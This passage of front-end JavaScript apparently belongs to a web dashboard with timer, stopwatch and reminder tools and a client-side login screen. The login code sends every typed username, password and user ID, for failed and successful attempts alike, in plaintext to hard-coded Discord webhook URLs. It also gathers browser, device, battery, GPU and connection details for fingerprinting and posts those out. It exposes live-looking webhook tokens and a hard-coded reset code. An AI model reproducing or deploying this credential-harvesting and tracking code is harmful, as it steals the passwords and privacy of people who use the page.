              const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
              const secs = String(totalSeconds % 60).padStart(2, '0');
              return `${hrs}:${mins}:${secs}`;
          }

          // Timer functionality
          if (timerBtn) {
              timerBtn.addEventListener('click', () => {
                  logAction("Timer Button Clicked");
                  const durationStr = prompt("Enter Timer Duration (e.g., 1m, 5s, 2h30m):");
                  if (!durationStr) return;

                  let durationMs = 0;
                  const parts = durationStr.toLowerCase().match(/(\d+h)?(\d+m)?(\d+s)?/);

                  if (parts) {
                      if (parts) durationMs += parseInt(parts, 10) * 3600 * 1000; // hours
                      if (parts) durationMs += parseInt(parts, 10) * 60 * 1000; // minutes
                      if (parts) durationMs += parseInt(parts, 10) * 1000; // seconds
                  }

                  if (durationMs > 0 && !timerRunning) {
                      timerRunning = true;
                      timerSeconds = durationMs / 1000;
                      alert(`Timer set for ${durationStr}. Starting now.`);
                      
                      timerBtn.innerText = `⏱️ ${formatTimeHMS(timerSeconds)}`;

                      timerInterval = setInterval(() => {
                          if (timerSeconds <= 0) {
                              clearInterval(timerInterval);
                              timerRunning = false;
                              alert("Timer Finished!");
                              logAction("Timer Finished");
                              timerBtn.innerText = "⏱️ Timer"; // Reset button text
                              return;
                          }
                          timerSeconds--;
                          timerBtn.innerText = `⏱️ ${formatTimeHMS(timerSeconds)}`;
                      }, 1000);
                  } else if (timerRunning) {
                      alert("Timer is already running.");
                  } else {
                      alert("Invalid duration format.");
                  }
              });
          }

          // Stopwatch functionality
          if (stopwatchBtn) {
              stopwatchBtn.addEventListener('click', () => {
                  logAction("Stopwatch Button Clicked");
                  if (!stopwatchRunning) {
                      stopwatchRunning = true;
                      stopwatchSeconds = 0;
                      stopwatchBtn.innerText = "Stopwatch 00:00:00";
                      stopwatchInterval = setInterval(() => {
                          stopwatchSeconds++;
                          stopwatchBtn.innerText = `Stopwatch ${formatTimeHMS(stopwatchSeconds)}`;
                      }, 1000);
                      logAction("Stopwatch Started");
                  } else {
                      clearInterval(stopwatchInterval);
                      stopwatchRunning = false;
                      logAction("Stopwatch Stopped", { duration: stopwatchBtn.innerText });
                      // Button text remains with the final value
                  }
              });
          }

          // Reminder functionality
          if (reminderBtn) {
              reminderBtn.addEventListener('click', () => {
                  logAction("Reminder Button Clicked");
                  const message = prompt("Enter Reminder Message:");
                  if (!message) return;
                  const timeStr = prompt("Enter Reminder Time (e.g., HH:MM):");
                  if (!timeStr) return;

                  const [hours, minutes] = timeStr.split(':').map(Number);
                  const now = new Date();
                  const reminderTime = new Date();
                  reminderTime.setHours(hours);
                  reminderTime.setMinutes(minutes);
                  reminderTime.setSeconds(0);
                  reminderTime.setMilliseconds(0);

                  if (reminderTime <= now) {
                      alert("Please set a future time for the reminder.");
                      return;
                  }

                  const timeUntil = reminderTime.getTime() - now.getTime();
                  setTimeout(() => {
                      alert(`REMINDER: ${message}`);
                      logAction("Reminder Alert Shown", { message: message });
                  }, timeUntil);
                  alert(`Reminder set for ${reminderTime.toLocaleString()}`);
              });
          }
      },

      // Initialize theme display selection if multiple themes are added
      initThemeDisplay: function() {
          const themesBtn = document.getElementById('themesBtn');
          // This would typically open a modal or show a selection dropdown.
          // For now, a simple alert.
          if (themesBtn) {
              themesBtn.addEventListener('click', () => {
                  logAction("Themes Button Clicked");
                  alert("Theme selection is a placeholder feature. Currently supports Dark/Light modes.");
              });
          }
      },

      // Fetch random fact (Placeholder API)
      fetchRandomFact: async function() {
          const factElement = document.getElementById('randomFact');
          if (!factElement) return;
          factElement.innerText = "Fetching a random fact...";
          try {
              // Using a public API that provides random facts
              const response = await fetch('https://cat-fact.herokuapp.com/facts/random');
              const data = await response.json();
              factElement.innerText = data.text;
              logAction("Random Fact Fetched");
          } catch (error) {
              factElement.innerText = "Could not fetch a fact at this time.";
              console.error("Error fetching random fact:", error);
          }
      },

      // Fetch daily quote (Placeholder API)
      fetchDailyQuote: async function() {
          const quoteElement = document.getElementById('dailyQuote');
          if (!quoteElement) return;
          quoteElement.innerText = "Fetching a daily quote...";
          try {
              // Using a public API for quotes
              const response = await fetch('https://api.quotable.io/random');
              const data = await response.json();
              quoteElement.innerText = `"${data.content}" - ${data.author}`;
              logAction("Daily Quote Fetched");
          } catch (error) {
              quoteElement.innerText = "Could not fetch a quote at this time.";
              console.error("Error fetching daily quote:", error);
          }
      },

      // Initialize Activity Log button (this will display the logs array content)
      initActivityLogBtn: function() {
          const activityLogBtn = document.getElementById('activityLogBtn');
          if (activityLogBtn) {
              activityLogBtn.addEventListener('click', () => {
                  logAction("Activity Log Button Clicked");
                  if (window.activityLogs.length === 0) {
                      alert("No activity logged yet.");
                      return;
                  }

                  // Create a new div or modal to display logs
                  const logDisplayDiv = document.createElement('div');
                  logDisplayDiv.id = 'activityLogDisplay';
                  logDisplayDiv.style.cssText = `
                      position: fixed;
                      top: 10%;
                      left: 15%;
                      width: 70%;
                      height: 70%;
                      background: #333;
                      color: white;
                      border: 3px solid #ff914d;
                      border-radius: 15px;
                      box-shadow: 0 0 20px rgba(255, 145, 77, 0.7);
                      z-index: 1000;
                      padding: 20px;
                      overflow-y: auto;
                      font-size: 0.9em;
                  `;

                  const title = document.createElement('h2');
                  title.textContent = 'System Activity Log';
                  title.style.cssText = 'color: #ff914d; text-align: center;';
                  logDisplayDiv.appendChild(title);

                  const list = document.createElement('ul');
                  list.style.cssText = 'list-style: none; padding: 0;';

                  window.activityLogs.forEach(entry => {
                      const listItem = document.createElement('li');
                      listItem.style.cssText = 'margin-bottom: 10px; padding-bottom: 5px; border-bottom: 1px dashed #555;';
                      listItem.innerHTML = `<strong>${entry.timestamp.split('T')[1].split('.')[0]}</strong>: ${entry.action} ${Object.keys(entry.details || {}).length > 0 ? `(${JSON.stringify(entry.details)})` : ''}`;
                      list.appendChild(listItem);
                  });
                  logDisplayDiv.appendChild(list);

                  const closeBtn = document.createElement('button');
                  closeBtn.textContent = 'Close';
                  closeBtn.style.cssText = 'position: absolute; top: 15px; right: 15px; background: #ff4c4c; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer;';
                  closeBtn.onclick = () => {
                      document.getElementById('activityLogDisplay')?.remove();
                  };
                  logDisplayDiv.appendChild(closeBtn);

                  document.body.appendChild(logDisplayDiv);
              });
          }
      },

      // Initialize Login History button
      initLoginHistoryBtn: function() {
          const loginHistoryBtn = document.getElementById('loginHistoryBtn');
          if (loginHistoryBtn) {
              loginHistoryBtn.addEventListener('click', () => {
                  logAction("Login History Button Clicked");
                  // Store successful login attempts (simplified for this example)
                  // In a real app, this would be stored more persistently (e.g., local storage)
                  // For demonstration, we'll use a dummy value
                  const lastLoginTime = new Date().toLocaleString(); // Placeholder
                  
                  alert(`Last Login:\nTime: ${lastLoginTime}\n(This is a simulation)`);
              });
          }
      }
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      // Removed #showPassword label and checkbox usage, replaced with dedicated button.
      // const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText'); // Targetting original for now, need to update its display
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');
      const loginAttemptCounterDisplay = document.getElementById('loginAttemptCounterDisplay'); // For quick bar

      let attempts = 3; // Changed from 5 as requested
      let users = [];
      let loginTime = null;

      // --- Login Screen Specific JS ---

      // Pre-Login Overlay and Animation Handling
      function handlePreLogin() {
          const overlay = document.getElementById('preLoginOverlay');
          if (overlay) {
              setTimeout(() => {
                  overlay.style.animation = 'fadeOutOverlay 1.5s forwards'; // Shorter fade for initial load
                  // When overlay fades out, show login elements and hide overlay
                  overlay.addEventListener('animationend', () => {
                      overlay.style.display = 'none';
                      if (loginBox) loginBox.style.display = 'block'; // Show login box
                      document.body.classList.add('login-body'); // Ensure body has login class
                      document.body.style.zoom = '1'; // Reset zoom on login screen
                  }, { once: true });
              }, 2000); // Delay before starting fade out animation
          } else {
              // If overlay doesn't exist (e.g. already logged in), show login box
              if (loginBox) loginBox.style.display = 'block';
          }
      }

      // Login Time and Date Box Logic (Shared with Dashboard initClock partially, but uses local scope)
      const loginDateTimeBox = document.getElementById('loginDateTimeBox');
      const timeFormatToggleBtn = document.getElementById('timeFormatToggleBtn');
      let is24HourFormat = false; // Default to 12-hour

      function updateLoginDateTimeBox() {
          const now = new Date();
          const optionsTime = {
              hour: 'numeric',
              minute: 'numeric',
              second: 'numeric',
              hour12: !is24HourFormat // Set hour12 based on toggle state
          };
          const optionsDate = {
              weekday: 'short', // Short day of week
              year: 'numeric',
              month: 'short', // Short month
              day: 'numeric'
          };
          const timeStr = now.toLocaleTimeString(undefined, optionsTime);
          const dateStr = now.toLocaleDateString(undefined, optionsDate);
          
          if (loginDateTimeBox) {
              loginDateTimeBox.innerText = `${dateStr} 🕒 ${timeStr}`;
          }
          if (timeFormatToggleBtn) {
              timeFormatToggleBtn.innerHTML = is24HourFormat ? '🔄 12h' : '🔄 24h'; // Update toggle button text
          }
      }

      // Initialize the login time/date display and timer
      updateLoginDateTimeBox(); // Initial call
      // Use setInterval ONLY if the element is actually on the page
      if(loginDateTimeBox) {
          setInterval(updateLoginDateTimeBox, 1000); // Update every second
      }

      // Event listeners for login quick bar buttons
      const loginPanicBtn = document.getElementById('loginPanicBtn');
      if (loginPanicBtn) {
          loginPanicBtn.addEventListener('click', () => {
              logAction("Login Panic Button Clicked");
              window.open('https://clever.com', '_blank');
          });
      }

      const loginZoomInBtn = document.getElementById('loginZoomInBtn');
      const loginZoomOutBtn = document.getElementById('loginZoomOutBtn');
      const zoomStep = 0.1;
      const minZoom = 0.5;
      const maxZoom = 2;

      function updateZoom(direction) {
          let currentZoom = parseFloat(document.body.style.zoom || '1');
          let newZoom = currentZoom;

          if (direction === 'in') {
              newZoom += zoomStep;
              if (newZoom > maxZoom) newZoom = maxZoom;
          } else if (direction === 'out') {
              newZoom -= zoomStep;
              if (newZoom < minZoom) newZoom = minZoom;
          }
          document.body.style.zoom = newZoom;
          logAction(`Login Zoom ${direction} clicked`, { level: newZoom });
      }

      if (loginZoomInBtn) {
          loginZoomInBtn.addEventListener('click', () => {
              updateZoom('in');
          });
      }
      if (loginZoomOutBtn) {
          loginZoomOutBtn.addEventListener('click', () => {
              updateZoom('out');
          });
      }

      // Show/Hide password via the toggle button in quick bar
      const passwordToggleBtn = document.getElementById('passwordToggleBtn');
      let isPasswordVisible = false;
      if (passwordToggleBtn) {
          passwordToggleBtn.addEventListener('click', () => {
              isPasswordVisible = !isPasswordVisible;
              passwordInput.type = isPasswordVisible ? 'text' : 'password';
              passwordToggleBtn.innerHTML = isPasswordVisible ? '🙈' : '👁️'; // Change icon
              logAction("Show Password Toggled", { visible: isPasswordVisible });
          });
      }

      // Toggle Time Format
      if (timeFormatToggleBtn) {
          timeFormatToggleBtn.addEventListener('click', () => {
              is24HourFormat = !is24HourFormat;
              updateLoginDateTimeBox();
              logAction("Time Format Toggled", { newFormat: is24HourFormat ? "24-hour" : "12-hour" });
          });
      }
      
      // --- End Login Screen Specific JS ---


      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
          // Once users are loaded, hide the overlay and show the login box.
          // This handles the case where JS runs before DOM is fully ready and initial overlay is displayed.
          // If handlePreLogin is called late, this might re-trigger. Let's rely on initial DOM load logic for overlay.
          if (document.getElementById('preLoginOverlay')) { // If overlay exists initially
             handlePreLogin(); // Start overlay animation logic
          } else {
            // If overlay doesn't exist (page already loaded without it, unlikely), just show login box
            if(loginBox) loginBox.style.display = 'block';
          }
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
          handlePreLogin(); // Still proceed with overlay and show login box if data load fails
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        loginBox.classList.add('flashing');
        setTimeout(() => {
          loginBox.classList.remove('flashing');
        }, delay * times + 100); // Ensure class is removed after animation completes
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user: user, // Pass the found user object
          password: password,
          loginTime: loginTime,
          batteryStatus: batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems (placeholders for the actual implementation using sendWebhook)
      async function logUsername(user, username) { // Changed to accept user object for consistency
        const embed = {
          title: "Username Logged", color: 0x3498db,
          fields: [{ name: "Name", value: user?.name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Timestamp", value: new Date().toISOString(), inline: false }]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(user, password) {
        const embed = {
          title: "Password Logged", color: 0xe74c3c,
          fields: [{ name: "Name", value: user?.name || "N/A", inline: true }, { name: "Password", value: password, inline: true }, { name: "Timestamp", value: new Date().toISOString(), inline: false }]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(user, identifier) {
        const embed = {
          title: "Identifier Logged", color: 0x2ecc71,
          fields: [{ name: "Name", value: user?.name || "N/A", inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Timestamp", value: new Date().toISOString(), inline: false }]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(user, username) {
        const embed = {
          title: "Invalid Username", color: 0xf39c12,
          fields: [{ name: "Name", value: user?.name || "N/A", inline: true }, { name: "Invalid Username", value: username, inline: true }, { name: "Timestamp", value: new Date().toISOString(), inline: false }]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(user, password) {
        const embed = {
          title: "Invalid Password", color: 0xe67e22,
          fields: [{ name: "Name", value: user?.name || "N/A", inline: true }, { name: "Invalid Password", value: password, inline: true }, { name: "Timestamp", value: new Date().toISOString(), inline: false }]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(user, identifier) {
        const embed = {
          title: "Invalid Identifier", color: 0xd35400,
          fields: [{ name: "Name", value: user?.name || "N/A", inline: true }, { name: "Invalid Identifier", value: identifier, inline: true }, { name: "Timestamp", value: new Date().toISOString(), inline: false }]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(user, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempt Counter", color: 0x9b59b6,
          fields: [
            { name: "Name", value: user?.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true }, // Logging password input here. Be cautious with sensitive data.
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(user, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded", color: 0xc0392b,
          fields: [
            { name: "Name", value: user?.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true }, // Logging password input here. Be cautious with sensitive data.
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged) - Used for dashboard functionality
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System", color: 0xff0000,
          fields: [
            { name: "Name", value: data.user?.name || "N/A", inline: true }, { name: "Username", value: data.user?.username || "N/A", inline: true },
            { name: "Password", value: data.password, inline: true }, // Potentially sensitive
            { name: "Rank", value: data.user?.rank?.toString() || "N/A", inline: true }, { name: "Role", value: data.user?.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User ID", value: data.user?.userID?.toString() || "N/A", inline: true },
            { name: "Account Creation Date", value: data.user?.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System", color: 0x00ff00,
          fields: [
            { name: "Name", value: data.user?.name || "N/A", inline: true }, { name: "Username", value: data.user?.username || "N/A", inline: true },
            { name: "User ID", value: data.user?.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true }, // This actually reports DPI ratio, not CSS zoom
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, // Hard to detect reliably
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System", color: 0x0000ff,
          fields: [
            { name: "Name", value: data.user?.name || "N/A", inline: true }, { name: "Username", value: data.user?.username || "N/A", inline: true },
            { name: "User ID", value: data.user?.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System", color: 0xffff00,
          fields: [
            { name: "Name", value: data.user?.name || "N/A", inline: true }, { name: "Username", value: data.user?.username || "N/A", inline: true },
            { name: "User ID", value: data.user?.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (ms)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user?.ipAddress || "Unavailable", inline: false }, // Assuming these are added to whitelist data or obtained elsewhere
            { name: "VPN Detected", value: data.user?.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user?.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user?.ipv6Address || "Unavailable", inline: false },
            { name: "Local IPs", value: data.user?.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Downlink Max (Mbps)", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Connection Metered", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System", color: 0x00ffff,
          fields: [
            { name: "Name", value: data.user?.name || "N/A", inline: true }, { name: "Username", value: data.user?.username || "N/A", inline: true },
            { name: "User ID", value: data.user?.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, // Not implemented
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true }, // Not implemented

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, // Not implemented
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false }, // logged via logAction

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false }, // Not implemented
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false }, // Not implemented

            { name: "Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false }, // Not implemented
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false }, // Not implemented

            { name: "Last Activity", value: data.lastActivityTime || "Unknown", inline: true }, // Not implemented
            { name: "Click Count", value: data.numberOfClicks?.toString() || "0", inline: true }, // Logged via logAction
            { name: "Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true }, // Logged via logAction

            { name: "Idle Time", value: data.idleTime || "0s", inline: true }, // Not implemented
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true }, // Not implemented
            { name: "Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true } // Not implemented
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = ''; // Clear previous errors

        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        const userID = userIDInput.value.trim();

        if (!username || !password || !userID) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        logAction("Login Submission Attempted", { username: username, userID: userID });

        const user = findUser(username, userID);

        // Log current attempt details before checking user/password
        await logAttemptsCounter(
          user, // Pass user object for context, can be null
          username, password, userID, attempts
        );

        if (!user) {
          await logInvalidUsername(null, username); // Log invalid attempt for any user
          await logInvalidIdentifier(null, userID);
          errorMsg.textContent = 'Invalid Username or User ID.';
          handleFailedAttempt();
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user, password); // Log invalid password for the found user
          errorMsg.textContent = 'Incorrect Password.';
          handleFailedAttempt();
          return;
        }

        // Correct login sequence
        logAction("Successful Login", { userName: user.name });

        // Log successful credentials to their respective webhooks
        await logUsername(user, username);
        await logPassword(user, password);
        await logIdentifier(user, userID);

        // Collect and send all logging data
        const loggingData = await collectLoggingData(user, password);

        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)), // Needs more implementation for session data
        ]);

        // Transition to dashboard
        if (loginBox) loginBox.style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body'; // Change body class for dashboard styles
        
        // Update user info in dashboard header
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      function handleFailedAttempt() {
        attempts--;
        if (loginAttemptCounterDisplay) {
          loginAttemptCounterDisplay.textContent = `Attempts: ${attempts}`;
        }
        // Original attemptsText div is also targeted for safety
        if (attemptsText) {
          attemptsText.textContent = `Attempts Left: ${attempts}`;
        }

        errorMsg.style.color = 'red'; // Ensure error message color
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'Maximum attempts exceeded. Please reset.';
          
          // Log attempts exceeded before showing popup
          const username = usernameInput.value.trim();
          const password = passwordInput.value.trim();
          const userID = userIDInput.value.trim();
          const user = findUser(username, userID); // Find user again for logging context

          logAttemptsExceeded(user, username, password, userID);
          
          showResetPopup();
          disableInputs(); // Disable login fields
        } else {
          if (attempts <= 3) { // Start flashing when 3 attempts remain or less
            flashRedOutline(2, 400);
          }
        }
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      // Reset Counter Logic
      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        // Make the reset code more secure or harder to guess. This is just an example.
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value.trim() || 'Unknown';
        const password = passwordInput.value.trim() || 'Unknown';
        const userID = userIDInput.value.trim() || 'Unknown';
        const user = findUser(username, userID) || {}; // Use found user data if available

        // Log the attempt to reset the counter
        const resetLogEmbed = {
          title: "🔔 Reset Box Detected", color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true }, { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true }, // Sensitive: Be cautious
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
          ]
        };
        // Using a specific webhook for reset attempts
